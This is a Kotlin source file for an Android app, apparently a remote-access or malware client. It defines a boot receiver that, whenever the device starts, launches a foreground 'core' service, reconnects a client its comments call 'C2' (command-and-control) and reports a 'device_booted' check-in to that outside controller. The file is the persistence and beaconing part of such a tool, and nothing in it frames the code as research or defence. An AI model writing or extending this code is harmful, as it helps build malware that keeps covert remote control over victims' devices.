package com.xrc.app.service

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log

class BootReceiver : BroadcastReceiver() {

    companion object {
        const val TAG = "BootReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        when (intent.action) {
            Intent.ACTION_BOOT_COMPLETED,
            Intent.ACTION_LOCKED_BOOT_COMPLETED -> {
                Log.i(TAG, "Boot completed, starting services")

                // Start core service
                val coreIntent = Intent(context, CoreService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(coreIntent)
                } else {
                    context.startService(coreIntent)
                }

                // Reconnect C2
                com.xrc.app.XRCApp.instance.c2Client.connect()

                // Send boot notification to C2
                com.xrc.app.XRCApp.instance.applicationScope.launch {
                    com.xrc.app.XRCApp.instance.c2Client.send("""{"type":"device_booted"}""")
                }
            }
        }
    }
}
